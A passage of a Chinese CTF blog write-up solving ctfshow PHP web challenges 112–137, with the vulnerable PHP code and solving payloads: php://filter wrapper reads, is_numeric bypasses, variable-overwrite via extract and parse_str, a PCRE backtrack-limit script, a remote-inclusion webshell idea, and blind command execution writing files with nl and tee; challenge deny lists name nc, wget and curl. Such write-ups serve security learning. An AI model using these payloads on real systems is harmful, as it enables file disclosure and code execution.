<p>举个例子</p>
<pre><code class="php">$a=123;
$b=456;
var_dump($GLOBALS);
</code></pre>
<p>返回内容较多就不一一列出了。我们只看最后两条，发现我们自行定义的变量会被输出。</p>
<pre><code>  [&quot;a&quot;]=&gt;
  int(123)
  [&quot;b&quot;]=&gt;
  int(456)
</code></pre><h2 id="112"><a href="#112" class="headerlink" title="112"></a>112</h2><pre><code class="PHP">function filter($file){
    if(preg_match(&#39;/\.\.\/|http|https|data|input|rot13|base64|string/i&#39;,$file)){
        die(&quot;hacker!&quot;);
    }else{
        return $file;
    }
}
$file=$_GET[&#39;file&#39;];
if(! is_file($file)){
    highlight_file(filter($file));
}else{
    echo &quot;hacker!&quot;;
}
</code></pre>
<p>考察点：php伪协议绕过is_file+highlight_file对于php伪协议的使用</p>
<p>函数介绍</p>
<pre><code class="php">is_file — 判断给定文件名是否为一个正常的文件
is_file ( string $filename ) : bool
12
</code></pre>
<p>我们的目的是不能让is_file检测出是文件，并且 highlight_file可以识别为文件。这时候可以利用php伪协议。<br> 可以直接用不带任何过滤器的filter伪协议<br> <code>payload:file=php://filter/resource=flag.php</code><br> 也可以用一些没有过滤掉的编码方式和转换方式<br> <code>payload:file=php://filter/read=convert.quoted-printable-encode/resource=flag.php</code><br> <code>file=compress.zlib://flag.php</code><br> <code>payload:file=php://filter/read=convert.iconv.utf-8.utf-16le/resource=flag.php</code></p>
<h2 id="113"><a href="#113" class="headerlink" title="113"></a>113</h2><pre><code class="php">highlight_file(__FILE__);
error_reporting(0);
function filter($file){
    if(preg_match(&#39;/\.\.\/|http|https|data|input|rot13|base64|string/i&#39;,$file)){
        die(&quot;hacker!&quot;);
    }else{
        return $file;
    }
}
$file=$_GET[&#39;file&#39;];
if(! is_file($file)){
    highlight_file(filter($file));
}else{
    echo &quot;hacker!&quot;;
} 
</code></pre>
<p>考察： php7.4里面的trick </p>
<p>包含文件32 会溢出,参考make php great again</p>
<p>非预期</p>
<p>compress.zlib://flag.php</p>
<h2 id="114"><a href="#114" class="headerlink" title="114"></a>114</h2><pre><code class="PHP">
error_reporting(0);
highlight_file(__FILE__);
function filter($file){
    if(preg_match(&#39;/compress|root|zip|convert|\.\.\/|http|https|data|data|rot13|base64|string/i&#39;,$file)){
        die(&#39;hacker!&#39;);
    }else{
        return $file;
    }
}
$file=$_GET[&#39;file&#39;];
echo &quot;师傅们居然tql都是非预期 哼！&quot;;
if(! is_file($file)){
    highlight_file(filter($file));
}else{
    echo &quot;hacker!&quot;;
} 
</code></pre>
<p>留了个filter</p>
<p><code>payload:file=php://filter/resource=flag.php</code></p>
<h2 id="115-trim函数的绕过-is-numeric绕过"><a href="#115-trim函数的绕过-is-numeric绕过" class="headerlink" title="115 trim函数的绕过+is_numeric绕过"></a>115 trim函数的绕过+is_numeric绕过</h2><pre><code class="php">function filter($num){
    $num=str_replace(&quot;0x&quot;,&quot;1&quot;,$num);
    $num=str_replace(&quot;0&quot;,&quot;1&quot;,$num);
    $num=str_replace(&quot;.&quot;,&quot;1&quot;,$num);
    $num=str_replace(&quot;e&quot;,&quot;1&quot;,$num);
    $num=str_replace(&quot;+&quot;,&quot;1&quot;,$num);
    return $num;
}
$num=$_GET[&#39;num&#39;];
if(is_numeric($num) and $num!==&#39;36&#39; and trim($num)!==&#39;36&#39; and filter($num)==&#39;36&#39;){
    if($num==&#39;36&#39;){
        echo $flag;
    }else{
        echo &quot;hacker!!&quot;;
    }
}else{
    echo &quot;hacker!!!&quot;;
}
</code></pre>
<p>考察点：trim函数的绕过+is_numeric绕过</p>
<p>函数介绍</p>
<pre><code>语法
trim(string,charlist)

参数    描述
string            必需。规定要检查的字符串。
charlist        可选。规定从字符串中删除哪些字符。如果省略该参数，则移除下列所有字符：

&quot;\0&quot;       - NULL
&quot;\t&quot;       - 制表符
&quot;\n&quot;       - 换行
&quot;\x0B&quot;     - 垂直制表符
&quot;\r&quot;       - 回车
&quot; &quot;        - 空格
</code></pre><p>做个简单的小测试</p>
<pre><code class="php">for ($i=0; $i &lt;128 ; $i++) { 
    $x=chr($i).&#39;1&#39;;
   if(is_numeric($x)==true){
        echo urlencode(chr($i)).&quot;\n&quot;;
   }
}
</code></pre>
<p>除了数字和+-.号以外还有 %09 %0a %0b %0c %0d %20<br> 再来看看 trim+is_numeric</p>
<pre><code class="php">for ($i=0; $i &lt;=128 ; $i++) { 
    $x=chr($i).&#39;1&#39;;
   if(trim($x)!==&#39;1&#39; &amp;&amp;  is_numeric($x)){
        echo urlencode(chr($i)).&quot;\n&quot;;
   }
}
</code></pre>
<p>发现除了+-.号以外还有只剩下%0c也就是换页符了，所以这个题只有这一个固定的解了。<br> <code>payload:num=%0c3</code></p>
<h2 id="116"><a href="#116" class="headerlink" title="116"></a>116</h2><h2 id="117"><a href="#117" class="headerlink" title="117"></a>117</h2><h2 id="118"><a href="#118" class="headerlink" title="118"></a>118</h2><h2 id="119"><a href="#119" class="headerlink" title="119"></a>119</h2><h2 id="120"><a href="#120" class="headerlink" title="120"></a>120</h2><h2 id="121"><a href="#121" class="headerlink" title="121"></a>121</h2><h2 id="122"><a href="#122" class="headerlink" title="122"></a>122</h2><h2 id="123-PHP的字符串解析特性和register-argc-argv"><a href="#123-PHP的字符串解析特性和register-argc-argv" class="headerlink" title="123 PHP的字符串解析特性和register_argc_argv"></a>123 PHP的字符串解析特性和register_argc_argv</h2><p><a href="https://www.freebuf.com/articles/web/213359.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/213359.html</a></p>
<pre><code class="php">$a=$_SERVER[&#39;argv&#39;];
$c=$_POST[&#39;fun&#39;];
if(isset($_POST[&#39;CTF_SHOW&#39;])&amp;&amp;isset($_POST[&#39;CTF_SHOW.COM&#39;])&amp;&amp;!isset($_GET[&#39;fl0g&#39;])){
    if(!preg_match(&quot;/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\{|\}|\&quot;|\&#39;|\,|\.|\;|\?/&quot;, $c)&amp;&amp;$c&lt;=18){

           eval(&quot;$c&quot;.&quot;;&quot;); 
         if($fl0g===&quot;flag_give_me&quot;){
             echo $flag;
         }
    }
}
</code></pre>
<p>第一个难搞的地方<code>isset($_POST[&#39;CTF_SHOW.COM&#39;])</code>因为php变量命名是不允许使用点号的</p>
<p>然后本地测试，又好像因为规则问题,导致.可以转化出来</p>
<p><img src="/2021/01/28/ctfshow-php特性/image-20210206112256539.png" alt="image-20210206112256539"></p>
<p> 另外一个知识点</p>
<pre><code>1、cli模式（命令行）下

    第一个参数$_SERVER[&#39;argv&#39;][0]是脚本名，其余的是传递给脚本的参数

2、web网页模式下

    在web页模式下必须在php.ini开启register_argc_argv配置项

    设置register_argc_argv = On(默认是Off)，重启服务，$_SERVER[‘argv’]才会有效果

    这时候的$_SERVER[‘argv’][0] = $_SERVER[‘QUERY_STRING’]

    $argv,$argc在web模式下不适用
</code></pre><p>因为我们是在网页模式下运行的，所以<code>$_SERVER[&#39;argv&#39;][0] = $_SERVER[&#39;QUERY_STRING&#39;]</code>也就是<code>$a[0]= $_SERVER[&#39;QUERY_STRING&#39;]</code><br> 这时候我们只要通过 <code>eval(&quot;$c&quot;.&quot;;&quot;);</code>将$flag赋值flag_give_me就可以了。</p>
<pre><code class="php">get:  $fl0g=flag_give_me;
post:  CTF_SHOW=1&amp;CTF%5bSHOW.COM=1&amp;fun=eval($a[0])

POST: 

CTF_SHOW=&amp;CTF[SHOW.COM=&amp;fun=echo $flag 

#125 

GET:?1=flag.php 

POST:CTF_SHOW=&amp;CTF[SHOW.COM=&amp;fun=highlight_file($_GET[1]) 

#126 

GET:?a=1+fl0g=flag_give_me 

POST:CTF_SHOW=&amp;CTF[SHOW.COM=&amp;fun=parse_str($a[1]) 

or

GET:?$fl0g=flag_give_me 

POST:CTF_SHOW=&amp;CTF[SHOW.COM=&amp;fun=assert($a[0]) 7
</code></pre>
<h2 id="127"><a href="#127" class="headerlink" title="127"></a>127</h2><pre><code class="php">include(&quot;flag.php&quot;);
highlight_file(__FILE__);
$ctf_show = md5($flag);
$url = $_SERVER[&#39;QUERY_STRING&#39;];


//特殊字符检测
function waf($url){
    if(preg_match(&#39;/\`|\~|\!|\@|\#|\^|\*|\(|\)|\\$|\_|\-|\+|\{|\;|\:|\[|\]|\}|\&#39;|\&quot;|\&lt;|\,|\&gt;|\.|\\\|\//&#39;, $url)){
        return true;
    }else{
        return false;
    }
}

if(waf($url)){
    die(&quot;嗯哼？&quot;);
}else{
    extract($_GET);
}


if($ctf_show===&#39;ilove36d&#39;){
    echo $flag;
} 
</code></pre>
<p>payload：</p>
<pre><code class="php">?ctf show=ilove36d
</code></pre>
<h2 id="128"><a href="#128" class="headerlink" title="128"></a>128</h2><pre><code class="PHP">error_reporting(0);
include(&quot;flag.php&quot;);
highlight_file(__FILE__);

$f1 = $_GET[&#39;f1&#39;];
$f2 = $_GET[&#39;f2&#39;];

if(check($f1)){
    var_dump(call_user_func(call_user_func($f1,$f2)));
}else{
    echo &quot;嗯哼？&quot;;
}
function check($str){
    return !preg_match(&#39;/[0-9]|[a-z]/i&#39;, $str);
}
</code></pre>
<p><a href="https://www.cnblogs.com/lost-1987/articles/3309693.html" target="_blank" rel="noopener">https://www.cnblogs.com/lost-1987/articles/3309693.html</a></p>
<p><a href="https://www.php.net/manual/zh/book.gettext.php" target="_blank" rel="noopener">https://www.php.net/manual/zh/book.gettext.php</a></p>
<p><strong>小知识点： _()是一个函数</strong></p>
<p>_()==gettext() 是gettext()的拓展函数，开启text扩展。需要php扩展目录下有php_gettext.dll</p>
<p>所以 <code>call_user_func(&#39;_&#39;,&#39;phpinfo&#39;)</code> 返回的就是phpinfo</p>
<p>因为我们要得到的flag就在flag.php中，所以可以直接用get_defined_vars</p>
<p><strong>get_defined_vars()函数</strong></p>
<p>get_defined_vars — 返回由所有已定义变量所组成的数组 这样可以获得 $flag</p>
<p>payload: ?f1=_&amp;f2=get_defined_vars</p>
<h2 id="129"><a href="#129" class="headerlink" title="129"></a>129</h2><pre><code class="php">if(isset($_GET[&#39;f&#39;])){
    $f = $_GET[&#39;f&#39;];
    if(stripos($f, &#39;ctfshow&#39;)&gt;0){
        echo readfile($f);
    }
}
</code></pre>
<p>函数介绍</p>
<pre><code>stripos() 
查找字符串在另一字符串中第一次出现的位置（不区分大小写）。
</code></pre><p>一个简单的方法就是远程文件包含，在自己的服务器上写个一句话，然后保存为txt文档。<br> 例如 f=<a href="http://url/xxx.txt?ctfshow" target="_blank" rel="noopener">http://url/xxx.txt?ctfshow</a><br> 其中xxx.txt为一句话</p>
<p>要是没有服务器的话，我们也可以用php伪协议绕过</p>
<p><code>payload:f=php://filter/read=convert.base64-encode|ctfshow/resource=flag.php</code><br> filter伪协议支持多种编码方式，无效的就被忽略掉了。</p>
<p><code>/ctfshow/../../../../var/www/html/flag.php</code></p>
<h2 id="130-131"><a href="#130-131" class="headerlink" title="130-131"></a>130-131</h2><pre><code class="PHP">
error_reporting(0);
highlight_file(__FILE__);
include(&quot;flag.php&quot;);
if(isset($_POST[&#39;f&#39;])){
    $f = $_POST[&#39;f&#39;];

    if(preg_match(&#39;/.+?ctfshow/is&#39;, $f)){
        die(&#39;bye!&#39;);
    }
    if(stripos($f, &#39;ctfshow&#39;) === FALSE){
        die(&#39;bye!!&#39;);
    }

    echo $flag;

} 
</code></pre>
<p>绕过preg_match</p>
<pre><code>f[]=1ctfshow
</code></pre><p>当然看师傅们的博客说的预期解是这样的：</p>
<p>考察点：利用正则最大回溯次数绕过</p>
<p><a href="https://www.laruence.com/2010/06/08/1579.html" target="_blank" rel="noopener">https://www.laruence.com/2010/06/08/1579.html</a></p>
<p><a href="https://www.freebuf.com/articles/web/190794.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/190794.html</a></p>
<p>PHP 为了防止正则表达式的拒绝服务攻击（reDOS），给 pcre 设定了一个回溯次数上限 pcre.backtrack_limit<br> 回溯次数上限默认是 100 万。如果回溯次数超过了 100 万，preg_match 将不再返回非 1 和 0，而是 false。这样我们就可以绕过第一个正则表达式了。<br> python脚本如下</p>
<pre><code class="python">import requests
url=&quot;http://03771c3c-6afb-4457-a719-19cc6ccf922e.chall.ctf.show/&quot;
data={
    &#39;f&#39;:&#39;very&#39;*250000+&#39;ctfshow&#39;
}
r=requests.post(url,data=data)
print(r.text)
</code></pre>
<h2 id="132"><a href="#132" class="headerlink" title="132"></a>132</h2><pre><code class="PHP">include(&quot;flag.php&quot;);
highlight_file(__FILE__);


if(isset($_GET[&#39;username&#39;]) &amp;&amp; isset($_GET[&#39;password&#39;]) &amp;&amp; isset($_GET[&#39;code&#39;])){
    $username = (String)$_GET[&#39;username&#39;];
    $password = (String)$_GET[&#39;password&#39;];
    $code = (String)$_GET[&#39;code&#39;];

    if($code === mt_rand(1,0x36D) &amp;&amp; $password === $flag || $username ===&quot;admin&quot;){

        if($code == &#39;admin&#39;){
            echo $flag;
        }


</code></pre>
<p>考察： php中&amp;&amp;和||运算符应用 </p>
<p>访问/admin，获得源代码</p>
<p>payload</p>
<pre><code>username=admin&amp;password=1&amp;code=admin
</code></pre><h2 id="133"><a href="#133" class="headerlink" title="133"></a>133</h2><pre><code class="PHP">if($F = @$_GET[&#39;F&#39;]){
    if(!preg_match(&#39;/system|nc|wget|exec|passthru|netcat/i&#39;, $F)){
        eval(substr($F,0,6));
    }else{
        die(&quot;6个字母都还不够呀?!&quot;);
    }
}

</code></pre>
<pre><code>get传参   F=`$F `;sleep 3
经过substr($F,0,6)截取后 得到  `$F `;
也就是会执行 eval(&quot;`$F `;&quot;);
我们把原来的$F带进去
eval(&quot;``$F `;sleep 3`&quot;);
也就是说最终会执行  `   `$F `;sleep 3  ` == shell_exec(&quot;`$F `;sleep 3&quot;);
前面的命令我们不需要管，但是后面的命令我们可以自由控制。
这样就在服务器上成功执行了 sleep 3
所以 最后就是一道无回显的RCE题目了
</code></pre><p>链接奉上:</p>
<p><a href="https://blog.csdn.net/qq_46091464/article/details/109095382" target="_blank" rel="noopener">https://blog.csdn.net/qq_46091464/article/details/109095382</a></p>
<h2 id="134"><a href="#134" class="headerlink" title="134"></a>134</h2><pre><code class="php">
highlight_file(__FILE__);
$key1 = 0;
$key2 = 0;
if(isset($_GET[&#39;key1&#39;]) || isset($_GET[&#39;key2&#39;]) || isset($_POST[&#39;key1&#39;]) || isset($_POST[&#39;key2&#39;])) {
    die(&quot;nonononono&quot;);
}
@parse_str($_SERVER[&#39;QUERY_STRING&#39;]);
extract($_POST);
if($key1 == &#39;36d&#39; &amp;&amp; $key2 == &#39;36d&#39;) {
    die(file_get_contents(&#39;flag.php&#39;));
}
</code></pre>
<ul>
<li>parse_str() 函数把查询字符串解析到变量中。</li>
<li>extract() 函数从数组中将变量导入到当前的符号表。</li>
</ul>
<pre><code class="php">?_POST[key1]=36d&amp;_POST[key2]=36d
</code></pre>
<h2 id="135"><a href="#135" class="headerlink" title="135"></a>135</h2><pre><code class="PHP">error_reporting(0);
highlight_file(__FILE__);
//flag.php
if($F = @$_GET[&#39;F&#39;]){
    if(!preg_match(&#39;/system|nc|wget|exec|passthru|bash|sh|netcat|curl|cat|grep|tac|more|od|sort|tail|less|base64|rev|cut|od|strings|tailf|head/i&#39;, $F)){
        eval(substr($F,0,6));
    }else{
        die(&quot;师傅们居然破解了前面的，那就来一个加强版吧&quot;);
    }
}
</code></pre>
<p>发现没有限制写文件</p>
<pre><code>payload:F=`$F `;nl f*&gt;xxx
1
</code></pre><p>然后再去访问url/xxx就可以得到flag了</p>
<h2 id="web136"><a href="#web136" class="headerlink" title="web136"></a>web136</h2><p>其实是再135的基础上增加了过滤 &gt;&lt;<br>但是linux中还可以用tee写文件</p>
<p>ls|tee xxx</p>
<p>我们先来看下当前目录下有啥文件，访问url/xxx发现只有一个index.php<br>那我们再去看看根目录下有什么文件</p>
<p>ls /|tee xxx</p>
<p>得到 f149_15_h3r3<br>最后直接打开就可以了</p>
<p>nl  /f149_15_h3r3|tee xxx</p>
<h2 id="137"><a href="#137" class="headerlink" title="137"></a>137</h2><p>class ctfshow<br>{<br>    function __wakeup(){<br>        die(“private class”);<br>    }<br>    static function getFlag(){<br>        echo file_get_contents(“flag.php”);<br>    }<br>}<br>call_user_func($_POST[‘ctfshow’]);</p>

        </div>
        <!-- .entry-content -->
        <div class="single-reward">
          <div class="reward-open">赏
            <div class="reward-main">
              <ul class="reward-row">
                <li class="alipay-code"><img src="/img/custom/donate/zhifubaoSQ.jpg"></li>
                <li class="wechat-code"><img src="/img/custom/donate/wechatSQ.jpg"></li>
              </ul>
            </div>
          </div>
        </div>
        <div style="text-align:center; width: 100%" class="social-share share-mobile" data-disabled="diandian, tencent"></div>
        <footer class="post-footer">
          <div class="post-lincenses"><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="nofollow"><i class="fa fa-creative-commons" aria-hidden="true"></i> 知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议</a></div>
          <div class="post-tags">
          </div>
          <div class="post-share">
            <div class="social-share sharehidden share-component"></div>
            <i class="iconfont show-share icon-forward"></i>
          </div>
        </footer><!-- .entry-footer -->
      </article>
      <!-- #post-## -->
      <div class="toc" style="background: none;"></div>
      <section class="post-squares nextprev">
        
          
            <div class="post-nepre half previous">
          
            <a href="/2021/01/28/ctfshow-ssrf/" rel="prev">
              <div class="background">
                <img class="lazyload" src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/loader/orange.progress-bar-stripe-loader.svg" data-src="\img\article\5.png" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" src="\img\article\5.png">
              </div>
              <span class="label">
              Previous Post</span>
              <div class="info">
                <h3>
                ctfshow-ssrf</h3>
                <hr>
              </div>
            </a>
          </div>
        
        
          
            <div class="post-nepre half next">
          
            <a href="/2021/01/27/ctfshow-文件包含/" rel="next">
              <div class="background">
                <img class="lazyload" src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/loader/orange.progress-bar-stripe-loader.svg" data-src="\img\article\9.png" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" src="\img\article\9.png">
              </div>
              <span class="label">
              Next Post</span>
              <div class="info">
                <h3>
                ctfshow_文件包含</h3>
                <hr>
              </div>
            </a>
          </div>
        
      </section>
      
      <section class="author-profile">
        <div class="info" itemprop="author" itemscope="" itemtype="https://schema.org/Person">
          <a href="" class="profile gravatar"><img src="\img\custom\head.jpg" itemprop="image" alt="Pp1ove" height="70" width="70"></a>
          <div class="meta">
            <span class="title">Author</span>
            <h3 itemprop="name">
            <a href="" itemprop="url" rel="author">Pp1ove</a>
            </h3>
          </div>
        </div>
        <hr>
        <p><i class="iconfont icon-write"></i>Pp1ove</p>
      </section>
    </main><!-- #main -->
  </div><!-- #primary -->
</div>



    </div>    
    <div class="ins-search">
    <div class="ins-search-mask"></div>
    <div class="ins-search-container">
        <div class="ins-input-wrapper">
            <input type="text" class="ins-search-input" placeholder="请输入关键词..."/>
            <span class="ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
        </div>
        <div class="ins-section-wrapper">
            <div class="ins-section-container"></div>
        </div>
    </div>
</div>
<script>
(function (window) {
    var INSIGHT_CONFIG = {
        TRANSLATION: {
            POSTS: '文章',
            // PAGES: '页面',
            CATEGORIES: '分类',
            TAGS: '标签',
        },
        ROOT_URL: '/',
        CONTENT_URL: '/content.json',
    };
    window.INSIGHT_CONFIG = INSIGHT_CONFIG;
})(window);
</script>
    
<!-- <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy; 2021 Pp1ove<br>
      powered_by <a href="http://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer> -->
<footer id="colophon" class="site-footer" role="contentinfo">
  <div class="site-info">
    <div class="footertext">
      <div class="img-preload">
        <img src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/other/wordpress-rotating-ball-o.svg">
        <img src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/other/disqus-preloader.svg">
      </div>
      <p style="color: #666666;">&copy 2021 HAPPY NEW YEAR !!!</p>
    </div>
       <center>
                网站已运行:<span id="run_time" style="color:black"></span>
            </center>

            <script>
                function runTime() {
                    var d = new Date(), str = '';
                    BirthDay = new Date("January 01,2021");
                    today = new Date();
                    timeold = (today.getTime() - BirthDay.getTime());
                    sectimeold = timeold / 1000
                    secondsold = Math.floor(sectimeold);
                    msPerDay = 24 * 60 * 60 * 1000
                    msPerYear = 365 * 24 * 60 * 60 * 1000
                    e_daysold = timeold / msPerDay
                    e_yearsold = timeold / msPerYear
                    daysold = Math.floor(e_daysold);
                    yearsold = Math.floor(e_yearsold);
                    //str = yearsold + "年";
                    str += daysold + "天";
                    str += d.getHours() + '时';
                    str += d.getMinutes() + '分';
                    str += d.getSeconds() + '秒';
                    return str;
                }
                setInterval(function () { $('#run_time').html(runTime()) }, 1000);
            </script>
    <div class="footer-device">
    <p style="font-family: 'Ubuntu', sans-serif;">
        <span style="color: #b9b9b9;">Theme <a href="https://github.com/honjun/hexo-theme-sakura" target="_blank" style="color: #b9b9b9;;text-decoration: underline dotted rgba(0, 0, 0, .1);">Sakura</a> <i class="iconfont icon-sakura rotating" style="color: #ffc0cb;display:inline-block"></i> by <a href="https://2heng.xin/" target="_blank" style="color: #b9b9b9;;text-decoration: underline dotted rgba(0, 0, 0, .1);">Mashiro</a>&<a href="https://www.hojun.cn/" target="_blank" style="color: #b9b9b9;;text-decoration: underline dotted rgba(0, 0, 0, .1);">Hojun</a>, Powered by Hexo, Hosted by Coding Pages</a>
        </span>
      </p>
    </div>
  </div><!-- .site-info -->
</footer>



<!-- <script src="/js/tocbot.js"></script> -->
<script type="text/javascript" src="/js/lib.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js"></script>
<script type="text/javascript" src="/js/InsightSearch.js"></script>
<script type="text/javascript" src="/js/jquery.fancybox.min.js"></script>
<script type="text/javascript" src="/js/zoom.min.js"></script>
<script type="text/javascript" src="/js/sakura-app.js"></script>
<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
<script src='//unpkg.com/valine@1.3.4/dist/Valine.min.js'></script>
<script src="/js/botui.js"></script>
<!-- 不蒜子 网页计数器 -->
<script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
<!-- <script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script> -->
<script type="text/javascript">
/* <![CDATA[ */
if (/Android|webOS|iPhone|iPod|BlackBerry/i.test(navigator.userAgent)) {
  var Poi = {"pjax":"1","movies":{"url": "","name":"","live":"close"},"windowheight":"fixed","codelamp":"close","ajaxurl":"","order":"asc","formpostion":"bottom"};
} else {
  var Poi = {"pjax":"1","movies":{"url": "","name":"","live":"open"},"windowheight":"auto","codelamp":"close","ajaxurl":"","order":"asc","formpostion":"bottom"};
}
/* ]]> */

</script>

<script>
$(document).ready(function() {
  if ($(".toc").length > 0 && document.body.clientWidth > 1200) {
    if ($(".pattern-center").length > 0) { //有图的情况
      tocbot.init({
          // Where to render the table of contents.
          tocSelector: '.toc', // 放置目录的容器
          // Where to grab the headings to build the table of contents.
          contentSelector: '.entry-content', // 正文内容所在
          // Which headings to grab inside of the contentSelector element.
          scrollSmooth: true,
          headingSelector: 'h1, h2, h3, h4, h5', // 需要索引的标题级别
          headingsOffset: -400,
          scrollSmoothOffset: -85
      });
    } else {
      tocbot.init({
          // Where to render the table of contents.
          tocSelector: '.toc', // 放置目录的容器
          // Where to grab the headings to build the table of contents.
          contentSelector: '.entry-content', // 正文内容所在
          // Which headings to grab inside of the contentSelector element.
          scrollSmooth: true,
          headingSelector: 'h1, h2, h3, h4, h5', // 需要索引的标题级别
          headingsOffset: -85,
          scrollSmoothOffset: -85
      });
    }
    var offsetTop = $('.toc').offset().top - 95;
    window.onscroll = function() {
      var scrollTop = window.pageYOffset || document.documentElement.scrollTop || document.body.scrollTop;
      if (scrollTop >= offsetTop) {
        $('.toc').addClass('toc-fixed');
      } else {
        $('.toc').removeClass('toc-fixed');
      }
    }
  }
});
</script>
<script src="https://cdn.jsdelivr.net/gh/stevenjoezhang/live2d-widget@latest/autoload.js"></script>
    <div class="openNav no-select" style="height: 50px;">
      <div class="iconflat no-select" style="width: 50px; height: 50px;">
        <div class="icon"></div>
      </div>
      <div class="site-branding search-form-submit">
        <i class="iconfont js-toggle-search iconsearch icon-search"></i>
      </div>
    </div>
  </section>

  <div class="skin-menu no-select" id="mainskin" style="position: fixed">
 <div class="theme-controls row-container">
  <ul class="menu-list">
   <li id="white-bg"> <i class="fa fa-television" aria-hidden="true"></i></li>
   <li id="sakura-bg"> <i class="iconfont icon-sakura"></i></li>
   <li id="gribs-bg"> <i class="fa fa-slack" aria-hidden="true"></i></li>
   <li id="KAdots-bg"> <i class="iconfont icon-dots"></i></li>
   <li id="totem-bg"> <i class="fa fa-optin-monster" aria-hidden="true"></i></li>
   <li id="pixiv-bg"> <i class="iconfont icon-pixiv"></i></li>
   <li id="bing-bg"> <i class="iconfont icon-bing"></i></li>
   <li id="dark-bg"> <i class="fa fa-moon-o" aria-hidden="true"></i></li>
  </ul>
 </div>
</div>
<canvas id="night-mode-cover"></canvas>
 
  <div class="changeSkin-gear no-select">
  <div class="keys" id="setbtn"> 
   <span id="open-skinMenu"> 切换主题 | SCHEME TOOL  
     <i class="iconfont icon-gear inline-block rotating"></i> 
   </span>
  </div>
</div>

  <div id="mo-nav" class="">
  <div class="m-avatar">
    <img src="/img/custom/head.jpg">
  </div>
  <p style="text-align: center; color: #333; font-weight: 900; font-family: 'Ubuntu', sans-serif; letter-spacing: 1.5px">さくら荘そのPp1ove</p>
  <p style="text-align: center; word-spacing: 20px;">
    
      
        <a href="http://github.com/Pp1ove" class="fa fa-github" target="_blank" style="color: #333; margin-left:20px"></a>
      
    
  </p>
  <ul id="menu-new-1" class="menu">
    
      <li>
        <a href="/">
          <span class="faa-parent animated-hover">
            <i class="fa  fa-fort-awesome faa-shake" aria-hidden="true"></i>
            首页
          </span>
        </a>
        
      </li>
    
      <li>
        <a href="/archives">
          <span class="faa-parent animated-hover">
            <i class="fa  fa-archive faa-shake" aria-hidden="true"></i>
            归档
          </span>
        </a>
        
          <ul class="sub-menu">
            
              <li>
                <a href="/categories/技术/">
                  <i class="fa fa-code" aria-hidden="true"></i>
                  技术
                </a>
              </li>
            
              <li>
                <a href="/categories/复现/">
                  <i class="fa fa-file-text-o" aria-hidden="true"></i>
                  复现
                </a>
              </li>
            
              <li>
                <a href="/categories/学科/">
                  <i class="fa fa-commenting-o" aria-hidden="true"></i>
                  学科
                </a>
              </li>
            
              <li>
                <a href="/categories/题目/">
                  <i class="fa fa-book" aria-hidden="true"></i>
                  题目
                </a>
              </li>
            
          </ul>
        
      </li>
    
      <li>
        <a href="javascript:;">
          <span class="faa-parent animated-hover">
            <i class="fa  fa-list-ul faa-vertical" aria-hidden="true"></i>
            清单
          </span>
        </a>
        
          <ul class="sub-menu">
            
              <li>
                <a href="/bangumi/">
                  <i class="fa fa-film faa-vertical" aria-hidden="true"></i>
                  番组
                </a>
              </li>
            
              <li>
                <a href="/music/">
                  <i class="fa fa-headphones" aria-hidden="true"></i>
                  歌单
                </a>
              </li>
            
              <li>
                <a href="/tags/图集/">
                  <i class="fa fa-photo" aria-hidden="true"></i>
                  图集
                </a>
              </li>
            
          </ul>
        
      </li>
    
      <li>
        <a href="/comment/">
          <span class="faa-parent animated-hover">
            <i class="fa  fa-pencil-square-o faa-tada" aria-hidden="true"></i>
            留言板
          </span>
        </a>
        
      </li>
    
      <li>
        <a href="/links/">
          <span class="faa-parent animated-hover">
            <i class="fa  fa-link faa-shake" aria-hidden="true"></i>
            友人帐
          </span>
        </a>
        
      </li>
    
      <li>
        <a href="/donate/">
          <span class="faa-parent animated-hover">
            <i class="fa  fa-heart faa-pulse" aria-hidden="true"></i>
            赞赏
          </span>
        </a>
        
      </li>
    
      <li>
        <a href="/">
          <span class="faa-parent animated-hover">
            <i class="fa  fa-leaf faa-wrench" aria-hidden="true"></i>
            关于
          </span>
        </a>
        
          <ul class="sub-menu">
            
              <li>
                <a href="/about/">
                  <i class="fa fa-meetup" aria-hidden="true"></i>
                  我？
                </a>
              </li>
            
          </ul>
        
      </li>
    
      <li>
        <a href="/client/">
          <span class="faa-parent animated-hover">
            <i class="fa  fa-android faa-vertical" aria-hidden="true"></i>
            客户端
          </span>
        </a>
        
      </li>
    
      <li>
        <a href="/atom.xml">
          <span class="faa-parent animated-hover">
            <i class="fa  fa-rss faa-pulse" aria-hidden="true"></i>
            RSS
          </span>
        </a>
        
      </li>
    
  </ul>
  <p style="text-align: center; font-size: 13px; color: #b9b9b9;">&copy 2019 hexo-sakura</p>
</div>
<button onclick="topFunction()" class="mobile-cd-top" id="moblieGoTop" title="Go to top" style="display: none;"><i class="fa fa-chevron-up" aria-hidden="true"></i></button>
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css">
<script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js"></script>
<!-- require MetingJS -->
<script src="https://cdn.jsdelivr.net/npm/meting@2/dist/Meting.min.js"></script>
<style>
  .aplayer .aplayer-lrc {
    height: 35px;
  }
  .aplayer .aplayer-lrc p{
    font-size: 16px;
    font-weight: 700;
    line-height: 18px !important;
  }
  .aplayer .aplayer-lrc p.aplayer-lrc-current{
    color: #FF1493;
  }
  .aplayer.aplayer-narrow .aplayer-body{
    left: -66px !important;
  }
  .aplayer.aplayer-fixed .aplayer-lrc {
    display: none;
  }
